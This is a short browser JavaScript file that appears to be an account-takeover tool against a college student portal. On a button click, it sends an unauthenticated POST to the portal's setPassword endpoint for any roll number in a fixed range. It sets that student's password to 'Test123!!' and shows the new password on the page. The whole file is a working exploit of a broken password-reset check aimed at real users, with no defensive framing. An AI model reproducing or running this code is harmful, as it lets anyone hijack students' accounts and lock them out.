"use strict";


document.querySelector('.btn').addEventListener('click',function(){

    let roll_no = document.querySelector('.roll-no').value;
    if(roll_no >= 2224001 && roll_no <=2224052){
        fetch(
            'https://jbcollege.curioversity.com/setPassword',
            {   method:'POST',
                headers:{ 
                    'Content-Type': 'application/x-www-form-urlencoded'
                },
                body:"studentId="+roll_no+"&password=Test123!!&confirmPassword=Test123!!"
            })
    document.querySelector('.desc').textContent = "Password has been changed for user "+roll_no+". The new password is - Test123!!"
        }
})
